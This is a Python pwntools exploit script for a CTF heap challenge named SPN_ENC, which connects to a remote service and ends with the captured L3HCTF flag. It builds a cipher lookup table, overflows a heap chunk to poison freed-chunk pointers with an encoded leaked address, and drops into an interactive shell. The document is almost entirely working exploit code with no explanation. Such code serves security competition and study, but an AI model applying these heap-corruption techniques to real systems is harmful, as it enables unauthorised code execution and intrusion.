from pwn import *
import json

#context.log_level = 'debug'

p = remote('124.71.194.126','9999')
#p = process('./SPN_ENC')
elf = ELF('./SPN_ENC')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


def malloc(idx,size):
    p.recvuntil('0.exit\n')
    p.sendline(str(1))
    p.sendlineafter('Size:',str(size))
    p.sendlineafter('Index:',str(idx))

def free(idx):
    p.recvuntil('0.exit\n')
    p.sendline(str(3))
    p.sendlineafter('Index:',str(idx))

def show(idx):
    p.recvuntil('0.exit\n')
    p.sendline(str(4))
    p.sendlineafter('Index:',str(idx))

def edit(idx,size,con):
    p.recvuntil('0.exit\n')
    p.sendline(str(2))
    p.sendlineafter('Index:',str(idx))
    p.sendlineafter('Size',str(size))
    p.sendafter('Content',con)

p.recvuntil('gift:')
shell = int(p.recvline()[:-1],16)
p.info('shell: '+hex(shell))
'''
malloc(0,0x2)
x = []
y = []
for i in range(0x100):
    for j in range(0x100):
        edit(0,0x2,p8(i)+p8(j))
        show(0)
        p.recvline()
        d = u16(p8(i)+p8(j))
        c = u16(p.recv(2))
        x.append(d)
        print(hex(d))
        y.append(c)

dic = dict(zip(y, x))
j = json.dumps(dic)   
f = open('test.txt', 'w')  
f.write(j)  
f.close()
'''
file = open('test.txt', 'r') 
js = file.read()
dic = json.loads(js)    
file.close()
#print(dic[str()])


malloc(0,0x10)
malloc(1,0x10)
malloc(2,0x10)

free(2)
free(1)
pay = 'A'*0x20
pay+= p16(dic[str(shell&0xffff)])
pay+= p16(dic[str((shell>>16)&0xffff)])
pay+= p16(dic[str((shell>>32)&0xffff)])
edit(0,0x26,pay)
malloc(3,0x10)
malloc(4,0x10)
edit(4,0x2,'AA')
p.recvuntil('0.exit\n')
p.sendline(str(5))
     
#gdb.attach(p)
p.interactive()
#L3HCTF{981f01280226acbba41093a38eea1d97}

